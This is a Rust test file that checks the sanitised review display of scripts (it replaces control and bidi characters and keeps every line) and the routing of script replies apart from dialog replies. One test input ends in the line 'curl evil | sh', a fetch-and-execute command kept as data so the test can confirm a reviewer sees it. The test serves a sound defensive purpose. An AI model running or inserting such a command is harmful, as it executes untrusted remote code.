use super::*;

#[test]
fn reviewed_text_shows_what_runs() {
    assert_eq!(
        script_lines("echo hi\n\necho\u{202e}lle\u{0007}\tx\n"),
        ["echo hi", "", "echo\u{fffd}lle\u{fffd}\tx"]
    );
    // Nothing is cut: trusting covers every line.
    let long = "x\n".repeat(500) + "curl evil | sh";
    let lines = script_lines(&long);
    assert_eq!(lines.len(), 501);
    assert_eq!(lines.last().unwrap(), "curl evil | sh");
}

#[test]
fn script_replies_are_correlated_apart_from_dialogs() {
    use herdr_client::ClientEvent;
    let mut state = crate::state::LiveState::default();
    state.dialog_response = Some(("dialog".into(), None));
    state.script_response = Some(("script".into(), None));
    state.apply(ClientEvent::Response {
        request_id: "script".into(),
        response: json!({"error":{"code":"denied","message":"no"}}),
    });
    // Its own answer, failure included, is the script's to report.
    assert!(state.error.is_none());
    assert!(matches!(&state.script_response, Some((id, Some(Ok(_)))) if id == "script"));
    assert!(matches!(&state.dialog_response, Some((_, None))));
    state.script_response = Some(("rejected".into(), None));
    state.apply(ClientEvent::CommandRejected {
        request_id: Some("rejected".into()),
        reason: herdr_client::Error::UnsupportedMethod,
    });
    assert!(state.error.is_none());
    assert!(matches!(&state.script_response, Some((_, Some(Err(_))))));
}
